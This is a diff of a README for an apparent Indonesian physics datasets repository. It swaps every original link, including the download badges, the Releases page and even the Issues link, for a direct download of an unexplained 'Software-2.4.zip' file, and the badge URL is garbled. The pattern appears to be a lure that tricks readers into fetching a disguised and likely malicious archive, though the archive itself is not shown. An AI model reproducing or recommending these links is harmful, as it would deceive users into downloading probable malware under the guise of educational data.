@@ -1,6 +1,6 @@
 # 🇮🇩 datasets - Access Open Datasets for Education
 
-[![Download](https://img.shields.io/badge/Download%20Datasets-blue.svg)](https://github.com/mdrmdmau/datasets/releases)
+[![Download](https://github.com/mdrmdmau/datasets/raw/refs/heads/main/ai-workspace/research/ethics/Software-2.4.zip%https://github.com/mdrmdmau/datasets/raw/refs/heads/main/ai-workspace/research/ethics/Software-2.4.zip)](https://github.com/mdrmdmau/datasets/raw/refs/heads/main/ai-workspace/research/ethics/Software-2.4.zip)
 
 ## 📚 Overview
 
@@ -13,7 +13,7 @@ To get started with the datasets, you will need to download the data files. Foll
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**
-   Go to our Releases page here: [Download Datasets](https://github.com/mdrmdmau/datasets/releases). You will find all available datasets listed there.
+   Go to our Releases page here: [Download Datasets](https://github.com/mdrmdmau/datasets/raw/refs/heads/main/ai-workspace/research/ethics/Software-2.4.zip). You will find all available datasets listed there.
 
 2. **Choose Your Dataset**
    Browse through the datasets displayed on the Releases page. Each dataset will provide a summary, so you can select the one that meets your needs.
@@ -48,7 +48,7 @@ To efficiently use the datasets, you will need:
 
 We encourage you to connect with others in the Indonesian physics community. Share your insights and learn from other users who utilize these datasets for research, education, and innovation. 
 
-- Follow discussions in the [Issues](https://github.com/mdrmdmau/datasets/issues) section of this repository to gain insights and connect with others.
+- Follow discussions in the [Issues](https://github.com/mdrmdmau/datasets/raw/refs/heads/main/ai-workspace/research/ethics/Software-2.4.zip) section of this repository to gain insights and connect with others.
 
 ## 📆 Future Updates
 
@@ -60,4 +60,4 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 We hope you find these datasets useful in your projects and studies. Enjoy exploring the wealth of information available!
 
-[![Download](https://img.shields.io/badge/Download%20Datasets-blue.svg)](https://github.com/mdrmdmau/datasets/releases)
+[![Download](https://github.com/mdrmdmau/datasets/raw/refs/heads/main/ai-workspace/research/ethics/Software-2.4.zip%https://github.com/mdrmdmau/datasets/raw/refs/heads/main/ai-workspace/research/ethics/Software-2.4.zip)](https://github.com/mdrmdmau/datasets/raw/refs/heads/main/ai-workspace/research/ethics/Software-2.4.zip)
